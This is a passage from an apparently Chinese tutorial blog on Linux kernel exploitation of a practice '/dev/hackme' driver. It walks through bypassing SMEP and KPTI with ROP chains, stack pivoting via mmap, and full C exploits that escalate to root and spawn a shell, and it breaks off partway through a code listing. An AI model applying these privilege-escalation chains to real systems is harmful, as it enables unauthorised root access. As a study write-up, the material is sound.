class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffffffff814c6410 T commit_creds </span><br><span class="hljs-comment">0xffffffff814c67f0 T prepare_kernel_cred </span><br><span class="hljs-comment">0xffffffff81006370: pop rdi; ret; </span><br><span class="hljs-comment">0xffffffff814443e0 T native_write_cr4</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_sp, user_cs, user_ss, user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_user_land</span><span class="hljs-params">()</span><br>&#123;<br>__asm__(<br><span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br><span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br><span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br><span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br><span class="hljs-string">&quot;pushf;&quot;</span><br><span class="hljs-string">&quot;pop user_rflags;&quot;</span><br><span class="hljs-string">&quot;.att_syntax;&quot;</span><br>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Saved userland registers&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] cs: 0x%lx \n&quot;</span>, user_cs);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] ss: 0x%lx \n&quot;</span>, user_ss);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] rsp: 0x%lx \n&quot;</span>, user_sp);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] rflags: 0x%lx \n\n&quot;</span>, user_rflags);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;****getshell****&quot;</span>);<br>system(<span class="hljs-string">&quot;id&quot;</span>);<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_rip = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)backdoor;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">lpe</span><span class="hljs-params">()</span><br>&#123;<br>__asm(<br><span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br><span class="hljs-string">&quot;movabs rax, 0xffffffff814c67f0;&quot;</span> <span class="hljs-comment">//prepare_kernel_cred</span><br><span class="hljs-string">&quot;xor rdi, rdi;&quot;</span><br><span class="hljs-string">&quot;call rax;&quot;</span> <span class="hljs-comment">//prepare_kernel_cred(0);</span><br><span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br><span class="hljs-string">&quot;mov rax, 0xffffffff814c6410;&quot;</span><br><span class="hljs-string">&quot;call rax;&quot;</span><br><span class="hljs-string">&quot;swapgs;&quot;</span><br><span class="hljs-string">&quot;mov r15, user_ss;&quot;</span><br><span class="hljs-string">&quot;push r15;&quot;</span><br><span class="hljs-string">&quot;mov r15, user_sp;&quot;</span><br><span class="hljs-string">&quot;push r15;&quot;</span><br><span class="hljs-string">&quot;mov r15, user_rflags;&quot;</span><br><span class="hljs-string">&quot;push r15;&quot;</span><br><span class="hljs-string">&quot;mov r15, user_cs;&quot;</span><br><span class="hljs-string">&quot;push r15;&quot;</span><br><span class="hljs-string">&quot;mov r15, user_rip;&quot;</span><br><span class="hljs-string">&quot;push r15;&quot;</span><br><span class="hljs-string">&quot;iretq;&quot;</span><br><span class="hljs-string">&quot;.att_syntax;&quot;</span><br>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, index = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/hackme&quot;</span>, O_RDWR);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buf[<span class="hljs-number">256</span>];<br>read(fd, buf, <span class="hljs-number">8</span>*<span class="hljs-number">11</span>);<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">11</span>; i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i:%d:data:0x%lx\n&quot;</span>,i, buf[i]);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> canary = buf[<span class="hljs-number">2</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> leak_addr = buf[<span class="hljs-number">10</span>];<br>save_user_land();<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> payload[<span class="hljs-number">256</span>];<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">16</span>); i ++)<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = canary;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff81006370</span>; <span class="hljs-comment">// pop rdi; ret;</span><br>payload[index++] = <span class="hljs-number">0x00000000000060</span>; <br>payload[index++] = <span class="hljs-number">0xffffffff814443e0</span>; <span class="hljs-comment">//native_write_cr4</span><br>payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)lpe;<br>write(fd, payload, index * <span class="hljs-number">8</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是在这个版本下的内核已经无法通过<code>native_write_cr4</code>函数改写<code>CR4</code>寄存器了，可以通过<code>dmesg</code>打印日志信息，可以发现</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021449923.png" alt="image-20230702144933868"></p><p>提示<code>pinned CR4 bits changed: 0x100000!?</code>的错误，并且<code>CR4</code>的值也没有被修改，这是因为在当前的内核版本中增加了校验，若后续通过<code>native_write_cr4</code>函数修改的值与启动的值不一致则会报错，并且将值修改为回来的值。</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021451086.png" alt="image-20230702145129045"></p><p>可以看到补丁的说明，在启动后<code>CR4</code>的值无法被修改。因此在改利用手法只能在对CR4进行校验的版本下使用。</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021454107.png" alt="image-20230702145422057"></p><h2 id="构造逃逸ROP"><a href="#构造逃逸ROP" class="headerlink" title="构造逃逸ROP"></a>构造逃逸ROP</h2><p>由于<code>SMEP</code>只是杜绝了执行用户态的代码，因此利用<code>ROP</code>的思路，在内核态完成<code>ROP</code>链的构造，并且执行<code>commit_creds(prepare_kernel_cred(0)) -&gt; swags -&gt; iretq</code>的流程。</p><p>那么此时需要什么样的<code>gadget</code>则是构造逃逸<code>ROP</code>的重点，由于需要手动传参调用上述的攻击链，因此需要</p><ul><li><code>pop rdi; ret;</code></li><li><code>mov rdi , rax; ret</code>，这里需要注意的是，我们需要<code>prepare_kernel_cred(0)</code>执行的返回值，因此需要将<code>rax</code>寄存器的值传递给<code>rdi</code>寄存器</li><li><code>swags; ret</code></li><li><code>iretq</code></li></ul><p>除了<code>mov rdi, rax; ret</code>以外，其余的<code>gadget</code>都可以很轻松的搜索出来，但是内核中不存在<code>mod rdi, rax; ret</code>这样的<code>gadget</code>，因此需要想办法找到其他的<code>gadget</code>，这里我找到如下的组合，通过构造<code>rdi</code>与<code>rsi</code>的值，使得<code>rdi = rsi</code>从而导致<code>jne</code>的跳转无法执行，那么就可以在执行<code>mov rdi, rax</code>的情况下可以跳过<code>jne</code>的跳转指令执行到<code>ret</code>指令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0xffffffff8166fea3</span>: mov rdi, rax; jne <span class="hljs-number">0x86fe73</span>; pop rbx; pop rbp; ret; <br><span class="hljs-number">0xffffffff81006370</span>: pop rdi; ret;<br><span class="hljs-number">0xffffffff818c6b35</span>: add rsi, <span class="hljs-number">1</span>; cmp rsi, rdi; jne <span class="hljs-number">0xac6b30</span>; pop rbp; ret; <br><span class="hljs-number">0xffffffff8150b97e</span>: pop rsi; ret;<br></code></pre></td></tr></table></figure><p>因此<code>ROP</code>逃逸的思路与在用户态的<code>ROP</code>区别不大，只要找到合适的<code>gadget</code>即可</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffffffff814c6410 T commit_creds </span><br><span class="hljs-comment">0xffffffff814c67f0 T prepare_kernel_cred </span><br><span class="hljs-comment">0xffffffff823d6b02: cmp rdi, 0xffffff; ret;</span><br><span class="hljs-comment">0xffffffff8166fea3: mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; </span><br><span class="hljs-comment">0xffffffff81006370: pop rdi; ret;</span><br><span class="hljs-comment">0xffffffff8100a55f: swapgs; pop rbp; ret; </span><br><span class="hljs-comment">0xffffffff818c6b35: add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; </span><br><span class="hljs-comment">0xffffffff814381cb: iretq; pop rbp; ret;</span><br><span class="hljs-comment">0xffffffff8150b97e: pop rsi; ret;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_cs,user_rflags,user_sp,user_ss;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_state</span><span class="hljs-params">()</span><br>&#123;<br>__asm(<br><span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br><span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br><span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br><span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br><span class="hljs-string">&quot;pushf;&quot;</span><br><span class="hljs-string">&quot;pop user_rflags;&quot;</span><br><span class="hljs-string">&quot;.att_syntax;&quot;</span><br>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***save state***&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_cs:0x%lx\n&quot;</span>, user_cs);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_sp:0x%lx\n&quot;</span>, user_sp);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_ss:0x%lx\n&quot;</span>, user_ss);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_rflags:0x%lx\n&quot;</span>, user_rflags);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***save finish***&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***getshell***&quot;</span>);<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>save_state();<br><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/hackme&quot;</span>, O_RDWR);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buf[<span class="hljs-number">256</span>];<br>read(fd, buf, <span class="hljs-number">0x10</span> * <span class="hljs-number">8</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i:%d\taddress:0x%lx\n&quot;</span>,i, buf[i]);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> canary = buf[<span class="hljs-number">2</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> payload[<span class="hljs-number">256</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">16</span>); i ++)<br>payload[index++] = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br>payload[index++] = canary;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff81006370</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814c67f0</span>; <span class="hljs-comment">//prepare_kernel_cred</span><br>payload[index++] = <span class="hljs-number">0xffffffff8150b97e</span>; <span class="hljs-comment">//pop_rsi_ret</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff81006370</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>payload[index++] = <span class="hljs-number">1</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff818c6b35</span>; <span class="hljs-comment">//add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; </span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff8166fea3</span>; <span class="hljs-comment">//mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; </span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814c6410</span>; <span class="hljs-comment">//commit_creds;</span><br>payload[index++] = <span class="hljs-number">0xffffffff8100a55f</span>; <span class="hljs-comment">//swapgs; pop rbp; ret; </span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814381cb</span>; <span class="hljs-comment">//iretq; pop rbp; ret;</span><br>payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)backdoor;<br>payload[index++] = user_cs;<br>payload[index++] = user_rflags;<br>payload[index++] = user_sp;<br>payload[index++] = user_ss;<br>write(fd, payload, index * <span class="hljs-number">8</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>栈迁移能使用的场景是当我们需要构造的<code>ROP</code>链大于能溢出的字节数时采用的与用户态不同的是在内核中存在很多可以修改<code>RSP</code>指针的<code>gadget</code>可以使用。这里我找到的<code>gadget</code>是，通过<code>pop rbp; ret</code>与<code>mov rsp, rbp</code>结合，就能够篡改<code>rsp</code>为任何值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0xffffffff818fa3ef</span>: xor rax, rdx; pop rbp; ret;<br><span class="hljs-number">0xffffffff810062dc</span>: mov rsp, rbp; pop rbp; ret;<br></code></pre></td></tr></table></figure><p>那么需要将<code>rsp</code>篡改为何值，此时就需要结合<code>mmap</code>函数，该函数能够在用户空间中开辟一段内存，该内存的属性可以自定义，因此思路则是将<code>rsp</code>的值指向<code>mmap</code>开辟的地址，通过栈迁移技术，将栈迁移到<code>mmap</code>的地址值，我们在将<code>ROP</code>链填充到<code>mmap</code>开辟的内存中即可，这里对<code>mmap</code>函数进行一个介绍。</p><h3 id="mmap函数"><a href="#mmap函数" class="headerlink" title="mmap函数"></a>mmap函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>addr</code>：开辟的地址值，若为0则操作系统自行选择，否则为填充的值，该地址的值需要页对齐（0x1000），并且最小的值需要为<code>0x10000</code>（这里是我自己测试的）</li><li><code>length</code>：内存的大小</li><li><code>prot</code>：权限<ul><li>PROT_EXEC，执行权限</li><li>PROT_READ，读权限</li><li>PROT_WRITE，写权限</li><li>PROT_NONE，没有任何权限</li></ul></li><li><code>flags</code>：标志位，<code>mmap</code>函数可以设置的标志位有很多，这里着重介绍一些常用的<ul><li><code>MAP_SHARED</code>：共享映射，映射的内容可以被其他进程所看到，同时能够同步到底层的文件</li><li><code>MAP_PRIVATE</code>：私有映射，映射的内容不能被其他进程所看到，也不会同步到底层的文件</li><li><code>MAP_ANONYMOUS</code>：匿名映射，是一种不映射文件的映射</li><li><code>MAP_FIXED</code>：固定映射，即映射地址必须是<code>addr</code>所指定的，若该地址被占用则<code>mmap</code>返回错误</li></ul></li><li><code>fd</code>：需要映射的文件描述符，若是匿名映射则设置为-1</li><li><code>offet</code>：映射的偏移，即选择从哪个位置开始映射</li></ul><p>映射代码如下，这里需要注意的是，由于我们只需要在用户空间中任意开辟一段可执行的内存，因此只需要进行匿名映射，并且地址值需要固定。因此<code>MAP_ANONYMOUS</code>与<code>MAP_FIXED</code>的标志位需要被指定，然后是<code>MAP_SHARED</code>与<code>MAP_PRIVATE</code>必须两个中指定一个，否则也会报错，因为这两个参数指明的是修改的内容是否会影响其他进程或者是底层的文件。</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021532399.png" alt="image-20230702153232364"></p><p>栈迁移完成</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021546383.png" alt="image-20230702154647334"></p><p>将<code>ROP</code>链部署在了映射内存中</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021547873.png" alt="image-20230702154758831"></p><p>最后是遇到的小疑惑，刚开始学习到栈迁移的时候会觉得奇怪，因为<code>mmap</code>开辟的内存是在用户态的，<code>SMEP</code>则是禁止执行用户态的代码，为什么使用栈迁移可以绕过<code>SMEP</code>，后面理解发现，我们只是访问了用户空间的地址即<code>0x2000</code>，但是这段用户态空间填写的地址都是内核态的地址，因此总结流程则是我们在用户态空间中填充了内核态的地址，在进行栈迁移绕过<code>SMEP</code>时，仅仅是访问了用户态空间的地址，最后执行时还是执行的内核态的地址，因此<code>SMEP</code>无法阻碍这种利用。而这也正是<code>SMAP</code>与<code>SMEP</code>的区别，<code>SMAP</code>则是无法读写用户态空间，因此若开启了<code>SMAP</code>，那么该利用手法则无法进行。</p><h1 id="绕过KPTI"><a href="#绕过KPTI" class="headerlink" title="绕过KPTI"></a>绕过KPTI</h1><p>KPTI（Kernel Page Table Isolation）是一种针对 Intel 处理器的内核保护机制，用于减轻 Spectre 和 Meltdown 等 CPU 可以被利用的安全漏洞所造成的影响。KPTI 的主要目的是隔离内核地址空间和用户地址空间，防止恶意程序通过访问内核地址空间来窃取敏感数据。</p><p>简单来说就是KPTI的保护即将用户空间的页与内核内核空间的页完全分隔开，那么在使用上述代码进行利用的时候会报出段错误，因为在内核空间的页中没办法找到用户空间的代码。</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021601379.png" alt="image-20230702160134339"></p><p>那么有两种方式可以绕过<code>KPTI</code></p><ul><li>捕获<code>Segmentation fault</code>的异常，在异常处理中调用<code>system(/bin/sh)</code></li><li>切换页表，将内核空间的页表切换到用户空间中去</li></ul><h2 id="run-sh-2"><a href="#run-sh-2" class="headerlink" title="run.sh"></a>run.sh</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>    -m 128M \<br>    -cpu kvm64,+smep\<br>    -kernel vmlinuz \<br>    -initrd initramfs.cpio.gz \<br>    -hdb flag.txt \<br>    -snapshot \<br>    -nographic \<br>    -monitor /dev/null \<br>    -no-reboot \<br>    -append &quot;console=ttyS0 nosmap  nokaslr kpti=1  quiet panic=1&quot; \<br>    -s<br></code></pre></td></tr></table></figure><h2 id="使用异常处理"><a href="#使用异常处理" class="headerlink" title="使用异常处理"></a>使用异常处理</h2><p>使用异常处理非常简单，只需要注册一个异常处理的函数去捕获<code>SIGSEGV</code>信号，在捕获到该信号时执行异常处理函数，可自定义为<code>system(&quot;/bin/sh&quot;)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">signal(SIGSEGV, backdoor);<br></code></pre></td></tr></table></figure><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffffffff814c6410 T commit_creds </span><br><span class="hljs-comment">0xffffffff814c67f0 T prepare_kernel_cred </span><br><span class="hljs-comment">0xffffffff823d6b02: cmp rdi, 0xffffff; ret;</span><br><span class="hljs-comment">0xffffffff8166fea3: mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; </span><br><span class="hljs-comment">0xffffffff8166ff23: mov rdi, rax; jne 0x86fef3; pop rbx; pop rbp; ret;</span><br><span class="hljs-comment">0xffffffff81006370: pop rdi; ret;</span><br><span class="hljs-comment">0xffffffff8100a55f: swapgs; pop rbp; ret; </span><br><span class="hljs-comment">0xffffffff818c6b35: add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; </span><br><span class="hljs-comment">0xffffffff814381cb: iretq; pop rbp; ret;</span><br><span class="hljs-comment">0xffffffff8150b97e: pop rsi; ret;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_cs,user_rflags,user_sp,user_ss;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_state</span><span class="hljs-params">()</span><br>&#123;<br>__asm(<br><span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br><span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br><span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br><span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br><span class="hljs-string">&quot;pushf;&quot;</span><br><span class="hljs-string">&quot;pop user_rflags;&quot;</span><br><span class="hljs-string">&quot;.att_syntax;&quot;</span><br>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***save state***&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_cs:0x%lx\n&quot;</span>, user_cs);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_sp:0x%lx\n&quot;</span>, user_sp);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_ss:0x%lx\n&quot;</span>, user_ss);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_rflags:0x%lx\n&quot;</span>, user_rflags);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***save finish***&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br><span 